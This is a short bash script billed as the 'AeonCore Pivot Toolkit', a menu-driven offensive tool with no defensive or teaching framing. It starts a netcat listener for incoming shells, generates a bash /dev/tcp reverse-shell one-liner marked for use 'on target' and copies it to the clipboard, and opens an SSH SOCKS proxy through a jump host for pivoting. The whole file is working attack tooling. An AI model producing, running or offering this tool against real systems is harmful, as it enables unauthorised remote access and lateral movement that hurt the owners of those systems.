#!/bin/bash

GHOST_FLAG="$HOME/Nexus/coreops/.ghost/ghost_enabled"

echo "=== AeonCore Pivot Toolkit ==="
echo "1) Start reverse shell listener"
echo "2) Generate reverse shell command"
echo "3) Create SOCKS proxy tunnel (SSH)"
echo "4) Exit"
echo ""

# Warn if ghost mode is on
if [[ -f "$GHOST_FLAG" ]]; then
    echo "[⚠] GHOST MODE ACTIVE — Outbound traffic may be blocked."
fi

read -p "Select option: " opt

case $opt in
  1)
    read -p "Local port to listen on: " LPORT
    echo "[+] Listening on port $LPORT..."
    nc -lvnp "$LPORT"
    ;;
  2)
    read -p "Your IP (listener): " LHOST
    read -p "Your Port: " LPORT
    SHELL_CMD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    echo "[*] Use this on target:"
    echo "$SHELL_CMD"
    if command -v xclip &>/dev/null; then
      echo "$SHELL_CMD" | xclip -selection clipboard
      echo "[+] Payload copied to clipboard."
    fi
    ;;
  3)
    read -p "SSH user@jump_host: " JUMP
    read -p "Local SOCKS port (e.g., 1080): " SPORT
    echo "[+] Starting proxy via $JUMP on port $SPORT..."
    ssh -D "$SPORT" -q -C -N "$JUMP" || echo "[-] SSH tunnel failed."
    ;;
  4)
    echo "Goodbye."
    exit 0
    ;;
  *)
    echo "Invalid option."
    ;;
esac
